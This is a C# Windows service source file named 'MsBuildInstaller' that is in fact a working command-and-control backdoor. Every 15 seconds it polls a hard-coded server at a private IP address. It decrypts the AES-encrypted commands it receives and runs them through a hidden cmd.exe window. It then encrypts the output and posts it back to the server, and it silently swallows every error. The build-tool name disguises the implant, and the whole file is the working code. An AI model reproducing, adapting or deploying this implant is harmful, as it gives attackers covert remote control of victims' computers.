using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Timers;
using System.Net.Http;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;




namespace MsBuildInstaller
{
    public partial class Service1 : ServiceBase
    {
        System.Timers.Timer tm = new System.Timers.Timer();
        private readonly HttpClient _httpClient;
        private string AES_PWD = "";



        private const string Url = "http://10.0.2.15:8081/";
        private int seconds = 15;


        public Service1()
        {
            InitializeComponent();
            _httpClient = new HttpClient();
        }

        protected override void OnStart(string[] args)
        {

            tm.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            tm.Interval = seconds * 1000;
            tm.Enabled = true;

        }

        protected override void OnStop()
        {
        }



        // AES Encryption function
        private static string aes_encrypt(string plainText, string password)
        {
            byte[] iv;
            byte[] encrypted;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = get_aes_key(password);
                aesAlg.GenerateIV();
                iv = aesAlg.IV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }

            // Combine IV and encrypted data
            byte[] result = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, result, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, result, iv.Length, encrypted.Length);
            return Convert.ToBase64String(result);
        }
        private static byte[] get_aes_key(string password)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                return sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
            }
        }



        // AES Decryption function
        private static string aes_decrypt(string cipherText, string password)
        {
            byte[] fullCipher = Convert.FromBase64String(cipherText);
            byte[] iv = new byte[16];
            byte[] cipher = new byte[fullCipher.Length - iv.Length];

            Buffer.BlockCopy(fullCipher, 0, iv, 0, iv.Length);
            Buffer.BlockCopy(fullCipher, iv.Length, cipher, 0, cipher.Length);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = get_aes_key(password);
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(cipher))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }








        private async void OnElapsedTime(object source, ElapsedEventArgs e)
        {


            try
            {
                string path = "1";
                var response = await _httpClient.GetAsync(Url+path);

                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();

                    if (content.Contains("NO"))
                    {
                        // do nothing
                        return;
                    }

                    //here we extract the key from the server
                    AES_PWD = "";
                    string[] parts = content.Split(':');
                    AES_PWD = parts[1];
                    content = parts[2];

                    content = aes_decrypt(content, AES_PWD);
                    if (content.StartsWith("CMD:"))
                    {

                        string commandToRun = content.Substring(4); // Remove "CMD:" prefix
                        var output = ExecuteCommand(commandToRun);

                        
                        //var outputContent = $"OUTPUT:{output}";
                        var outputContent = aes_encrypt(output,AES_PWD);

                        await SendPostRequest(outputContent);

                    }else
                    {
                        // ....
                    }



                }


            }
            catch(Exception ex) {
            

            }

        }



        private static async Task SendPostRequest(string content)
        {
            HttpClient postclient = new HttpClient();
            try
            {
               
                string path = "2";
                var postContent = new StringContent(content, Encoding.UTF8, "text/plain");
                var response = await postclient.PostAsync(Url + path, postContent);

            }
            catch (Exception ex)
            {

            }
            postclient.Dispose();
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(procStartInfo))
                {
                    string result = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    string finalOutput = result + (string.IsNullOrEmpty(error) ? "" : error);
                    return finalOutput;
                }
            }
            catch (Exception ex)
            {
                return "Error";
            }
        }




    }
}
